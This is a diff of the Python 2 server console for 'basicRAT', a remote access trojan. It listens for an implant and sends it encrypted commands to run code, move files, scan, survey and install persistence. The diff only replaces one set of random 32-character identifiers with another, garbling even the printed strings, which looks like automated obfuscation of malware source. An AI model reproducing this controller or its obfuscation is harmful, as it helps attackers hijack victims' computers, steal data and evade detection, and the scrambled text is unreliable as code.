@@ -7,12 +7,12 @@ import struct
 import sys
 import time
 try:
-    from core.crypto import CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR,aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu,uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc
-    from core.filesock import CJaDqhybJXLaLvKovpVOBoslaLrUFgCi, fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB
-except ImportError as YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF:
-    print YWGwOkqWBDPrjsjKmKjRtdIblOwMSAAF
+    from core.crypto import sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ,rupicluuYAUuPXtZzzprBLFiIHrFbgdx,GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm
+    from core.filesock import sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe, uwhiOqBSmedbvGGpKrsruHWAGHrUprFP
+except ImportError as nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk:
+    print nIIdsEpTvQEohvLzsFtrwptbWNNxzJSk
     sys.exit(0)
-fpoXqNOhSRWoXzlfNwfmsTQXwpcyeiZa = '''
+pETZxiAzknEyrvKsOnhTIFdqGjoQpUyd = '''
 download <files>    - Download file(s).
 help                - Show this help menu.
 persistence         - Apply persistence mechanism.
@@ -25,7 +25,7 @@ unzip <file>        - Unzip a file.
 upload <files>      - Upload files(s).
 wget <url>          - Download a file from the web.
 '''
-fPstBtkNLrsmVNqPeOxiVnaQpzerLyiV = '''
+mNZqLkmtEJHIAhPYBdqLxuJqeAJREMVT = '''
 ______           _     ______  ___ _____   _            _
 | ___ \         (_)    | ___ \/ _ \_   _| | |          | |
 | |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
@@ -33,61 +33,61 @@ ______           _     ______  ___ _____   _            _
 | |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
 \____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
 '''
-CDdYFXHTZelLTTEPRhkydlgmGXHeQsAV = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
+EmZtFxTUgeGDKrXqoNRJejwcGCEaCKVX = [ 'download', 'help', 'persistence', 'quit', 'rekey', 'run',
              'scan', 'survey', 'unzip', 'upload', 'wget' ]
-def IxAGNmkUeWrwPcbusaWhthFnjztZnmOk():
-    gTFfKnTsiKohURoFyrnCewGwRBsfrWXM = argparse.ArgumentParser(description='basicRAT server')
-    gTFfKnTsiKohURoFyrnCewGwRBsfrWXM.add_argument('-p', '--port', help='Port to listen on.',
+def BMDLnGIiUKJxfEUdhTeedXjqYREIhatA():
+    lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls = argparse.ArgumentParser(description='basicRAT server')
+    lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls.add_argument('-p', '--port', help='Port to listen on.',
                         default=1337, type=int)
-    return gTFfKnTsiKohURoFyrnCewGwRBsfrWXM
-def dzIXxNJjKrHldXbZNcDmXhAACACtFDWk():
-    gTFfKnTsiKohURoFyrnCewGwRBsfrWXM  = IxAGNmkUeWrwPcbusaWhthFnjztZnmOk()
-    cGioHkAdqcrceoJXimMasZjCPNWIhdID    = vars(gTFfKnTsiKohURoFyrnCewGwRBsfrWXM.parse_args())
-    RTMBSdXjnyEmpmcRVRddHitocIzwPUUR    = cGioHkAdqcrceoJXimMasZjCPNWIhdID['port']
-    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    return lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls
+def kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO():
+    lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls  = BMDLnGIiUKJxfEUdhTeedXjqYREIhatA()
+    IzOEJGRrCbjCiYYDYRVBBQJTCiCacylI    = vars(lgUZJzDkaHeyRZuKCxAKXzcDBTSRLOls.parse_args())
+    oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi    = IzOEJGRrCbjCiYYDYRVBBQJTCiCacylI['port']
+    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.bind(('0.0.0.0', RTMBSdXjnyEmpmcRVRddHitocIzwPUUR))
+        DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.bind(('0.0.0.0', oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi))
     except socket.error:
-        print 'Error: Unable to start jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu, RTMBSdXjnyEmpmcRVRddHitocIzwPUUR {} in use?'.format(RTMBSdXjnyEmpmcRVRddHitocIzwPUUR)
+        print 'Error: Unable to start XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU, oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi {} in use?'.format(oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi)
         sys.exit(1)
-    for FyqZARsTodXWyYYCxemSnwzNZUZyQfNZ in fPstBtkNLrsmVNqPeOxiVnaQpzerLyiV.split('\n'):
+    for DRJPzgtteNMcVgYqxduWLGvGkPCyUwtJ in mNZqLkmtEJHIAhPYBdqLxuJqeAJREMVT.split('\n'):
         time.sleep(0.05)
-        print FyqZARsTodXWyYYCxemSnwzNZUZyQfNZ
-    print 'basicRAT jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu listening on RTMBSdXjnyEmpmcRVRddHitocIzwPUUR {}...'.format(RTMBSdXjnyEmpmcRVRddHitocIzwPUUR)
-    WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.listen(10)
-    HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, PMrCKTKaeoKheCLNSDGXOwfvDBaddMYv = WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.accept()
-    ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu=True)
+        print DRJPzgtteNMcVgYqxduWLGvGkPCyUwtJ
+    print 'basicRAT XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU listening on oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi {}...'.format(oSWYQdqMVKzHKLEwpPwXYgscyrvwmwPi)
+    DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.listen(10)
+    HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, ZZLSoznvcTQvgVPkCShuzIlxGjRxOspc = DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.accept()
+    JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU=True)
     while True:
-        wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb = raw_input('\n[{}] basicRAT> '.format(PMrCKTKaeoKheCLNSDGXOwfvDBaddMYv[0])).rstrip()
-        if not wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb:
+        LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU = raw_input('\n[{}] basicRAT> '.format(ZZLSoznvcTQvgVPkCShuzIlxGjRxOspc[0])).rstrip()
+        if not LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU:
             continue
-        MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud, _, gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy = wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb.partition(' ')
-        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud not in CDdYFXHTZelLTTEPRhkydlgmGXHeQsAV:
-            print 'Invalid command, type "help" to see qItbZWUsfTFBRLghDxuMCwfxSFENCkvP list of commands.'
+        KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS, _, zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO = LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU.partition(' ')
+        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS not in EmZtFxTUgeGDKrXqoNRJejwcGCEaCKVX:
+            print 'Invalid command, type "help" to see EOSBjCIkNHcpPEaxHocSUgxjrNoSwmSq list of commands.'
             continue
-        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'help':
-            print fpoXqNOhSRWoXzlfNwfmsTQXwpcyeiZa
+        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'help':
+            print pETZxiAzknEyrvKsOnhTIFdqGjoQpUyd
             continue
-        HfmhtOOvofDObYOITyVEsgfvXrGHjkFx.send(aNZTYevmZkLIbpnXMxKrkTKZcOnrEXIu(wkMsTNFVCLVsEHBiYJUEcuZCHElKIJvb, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl))
-        if MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'quit':
-            WerXeVRoSuIOUzPqeUfRcYEiijTiROFb.close()
+        HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut.send(rupicluuYAUuPXtZzzprBLFiIHrFbgdx(LWOcvjQJQskZAgphXzMwnQEmyNbaAQNU, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD))
+        if KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'quit':
+            DZqtnqwIIAtdcrVFFphUANAFRUgKenqA.close()
             sys.exit(0)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'run':
-            ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn = HfmhtOOvofDObYOITyVEsgfvXrGHjkFx.recv(4096)
-            print CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR(ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl).rstrip()
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'download':
-            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
-                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
-                CJaDqhybJXLaLvKovpVOBoslaLrUFgCi(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'upload':
-            for eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci in gsrqjuQJszGCieVrlRqzMyCtRpFCFtmy.split():
-                eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci = eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci.strip()
-                fwTVfMnsGkhBgXZUJprRUDzBlsiQfVQB(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, eNbzIjEVvLYLmhmunDRWLfdfFIkdeGci, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud == 'rekey':
-            ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl = uzwtEZAIcAlkEUgSDDweqaCnAdgheMQc(HfmhtOOvofDObYOITyVEsgfvXrGHjkFx, jybzhUMtEcXpeFKNLZgKTPNKIrRsixZu=True)
-        elif MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
-            print 'Running {}...'.format(MZjtiGZVcQHaSMEgBkZJKQMEoowtqiud)
-            ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn = HfmhtOOvofDObYOITyVEsgfvXrGHjkFx.recv(1024)
-            print CkoyYDxmdvqmpDqmiDQfNmYJEooZuJfR(ulHhNPLgxwxnOclzqKlvxuWLJmQjqOWn, ltXIeHWYNEPcKMYbxApfUrHOjtXlQBzl)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'run':
+            EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj = HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut.recv(4096)
+            print sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ(EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD).rstrip()
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'download':
+            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
+                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
+                sNdGHwfRcufgNuCsHbgAAzzPLlkgojAe(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'upload':
+            for XxPlchPxQLRKcdYmEIicQIuINeJVwooa in zVZRMkjmSSANRUTMtnVZiGTkHCKbkJsO.split():
+                XxPlchPxQLRKcdYmEIicQIuINeJVwooa = XxPlchPxQLRKcdYmEIicQIuINeJVwooa.strip()
+                uwhiOqBSmedbvGGpKrsruHWAGHrUprFP(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XxPlchPxQLRKcdYmEIicQIuINeJVwooa, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS == 'rekey':
+            JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD = GZwddfwOTaBNFKKNcZkODnEKpIiNMMLm(HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut, XNsOIHPopBIpeYvgSKSNjPwHtbrbvTJU=True)
+        elif KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
+            print 'Running {}...'.format(KamfLYxxVgVlRwXVhOIJivGcyTVZXRwS)
+            EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj = HXkqtNNfHrDTPOyLEvgWvQIeHfTdkXut.recv(1024)
+            print sUdzqtLgbOHLwwhpgZAqnWQnkYcohXdZ(EhnerJKnMsPBhZNlRbiSjZHDpvJxwOQj, JuKxmoAvQPCxuBFgJgVBrMXQleyCAMTD)
 if __name__ == '__main__':
-    dzIXxNJjKrHldXbZNcDmXhAACACtFDWk()
+    kdouLsgGNghZiSMWCCgMSGHXwZSRPGcO()
